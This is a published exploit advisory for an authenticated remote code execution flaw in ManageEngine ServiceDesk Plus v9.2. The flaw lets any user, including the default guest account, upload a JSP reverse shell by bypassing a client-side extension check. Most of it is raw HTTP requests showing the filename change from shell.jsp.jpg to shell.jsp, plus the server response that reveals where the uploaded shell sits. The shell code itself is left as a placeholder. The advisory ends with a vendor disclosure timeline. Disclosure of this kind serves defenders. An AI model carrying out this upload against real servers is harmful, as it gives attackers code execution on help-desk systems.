# manageeningefileupload


Exploit Title: Authenticated Remote Code Execution via File Upload Vulnerability in ManageEngine ServiceDesk Plus (Authenticated)


Date: 14-Nov-2016


Discovered by Omer Alper Karakus (omeralperkarakus[at]gmail.com), Abdullah Sinan Sekerci (lpthread999[at]gmail.com), Anil Aytac (4nl[at]aytac.email), Asli Koksal (koksal.a[at]gmail.com), STM


Affected Product: ManageEngine ServiceDesk Plus


Tested on: v9.2 build number 9232


File upload vulnerability can only be exploited by an authenticated user which can also be any low privileged user like guest (default account: u:guest/p:guest)
This vulnerability can be exploited by uploading a JSP file instead of image file. Since the file extension has been checked on the client side, it is possible to upload a jsp file which contains a reverse shell by intercepting the request and changing the file extension from .jsp.jpg to .jsp.

<pre>
REQUEST:
===========================================================================================
POST /jsp/UploadImage.jsp HTTP/1.1
Host: 192.168.56.142:8080
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.142:8080/WorkOrder.do?1479198413617&
Cookie: JSESSIONID=FE6E5837539BFDE8DA78680F00B251A2; JSESSIONIDSSO=B469F14D393E3113D28896A41F79B0D8
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------229512600118535
Content-Length: 1902

-----------------------------229512600118535
Content-Disposition: form-data; name="img_file"; filename="shell.jsp.jpg"
Content-Type: image/jpeg

{...JSP reverse shell code...}

-----------------------------229512600118535
Content-Disposition: form-data; name="zereqid"


-----------------------------229512600118535
Content-Disposition: form-data; name="Module"

WorkOrder
-----------------------------229512600118535--
</pre>

<pre>
EDITED REQUEST:
===========================================================================================
POST /jsp/UploadImage.jsp HTTP/1.1
Host: 192.168.56.142:8080
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.142:8080/WorkOrder.do?1479198413617&
Cookie: JSESSIONID=FE6E5837539BFDE8DA78680F00B251A2; JSESSIONIDSSO=B469F14D393E3113D28896A41F79B0D8
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------229512600118535
Content-Length: 1902

-----------------------------229512600118535
Content-Disposition: form-data; name="img_file"; filename="shell.jsp"
Content-Type: image/jpeg

{...JSP reverse shell code...}

-----------------------------229512600118535
Content-Disposition: form-data; name="zereqid"


-----------------------------229512600118535
Content-Disposition: form-data; name="Module"

WorkOrder
-----------------------------229512600118535--
</pre>
<pre>
After a succesful request, the response shows us the location of our reverse shell file:
RESPONSE
===========================================================================================
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Content-Length: 528
Date: Tue, 15 Nov 2016 08:27:55 GMT
Connection: close
Server: -
		<script lang="JavaScript" type="text/JavaScript">
  		var formName = parent.document.getElementById("FORMNAME").value;
		var opts = parent.document.forms[formName].INLINEIMAGES.options;
		var imgName = "1479198475119.jsp";
		var option = new Option(imgName, imgName);
		option.selected = true;
		opts[opts.length] = option;
  		//alert("/inline/"+"WorkOrder"+"/"+"4"+"/"+"1479198475119.jsp");
  		parent.ZE.activeEditor.previewImage("/inline/"+"WorkOrder"+"/"+"4"+"/"+"1479198475119.jsp");//No i18n
		</script>
</pre>		
		
<pre>
Timeline
======
 
15-Nov-2016 – Notification to Vendor
18-Nov-2016 – Response from Vendor
01-Dec-2016 - Issue has been fixed by vendor https://www.manageengine.com/products/service-desk/readme-9.2.html
</pre>
